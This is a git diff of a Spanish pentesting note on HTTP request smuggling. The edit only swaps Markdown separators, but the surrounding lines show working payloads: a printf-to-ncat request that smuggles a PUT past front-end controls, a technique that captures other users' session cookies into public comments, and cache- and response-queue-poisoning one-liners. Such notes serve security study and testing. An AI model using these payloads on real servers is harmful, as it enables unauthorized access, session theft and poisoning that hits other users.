@@ -20,7 +20,7 @@ linked:
 ---
 # HTTP Request Smuggling - Explotación
 
-***
+---
 
 ## Bypass de Front-end Controls
 
@@ -34,7 +34,7 @@ linked:
 | `printf '... \r\n\r\n0\r\n\r\nPUT /admin/config HTTP/1.1\r\nHost: target\r\nContent-Length: 20\r\n\r\nconfig=evil' \| ncat target 80` | Smuggle PUT method bloqueado en front | Method-restricted endpoint. |
 ^hrs-exploit-bypass
 
-___
+---
 
 ## Request Capture / Hijack
 
@@ -68,7 +68,7 @@ comment=
 
 Próxima request user se concatena al `comment=`. Si user manda `GET /home HTTP/1.1\r\nCookie: session=abc...` → todo queda como valor del comment → atacante lo ve público en `/comments`.
 
-___
+---
 
 ## Web Cache Poisoning vía Smuggle
 
@@ -81,7 +81,7 @@ ___
 | `printf '... 0\r\n\r\nGET /notfound HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` (con response controlado) | Cached error page hostil | Custom 404 cache poison. |
 ^hrs-exploit-cache
 
-___
+---
 
 ## Response Queue Poisoning
 
@@ -94,7 +94,7 @@ ___
 | Burp HTTP Request Smuggler → "Queue poisoning" mode | Auto-setup queue desync | Tool-driven. |
 ^hrs-exploit-queue
 
-___
+---
 
 ## Reflected XSS Chain via Smuggling
 
@@ -107,4 +107,4 @@ ___
 | Combine cache: post-smuggle verificar `curl https://target/ \| grep -i "<script"` | Cache poison persiste XSS | Multi-victim impact. |
 ^hrs-exploit-xss
 
-***
+---
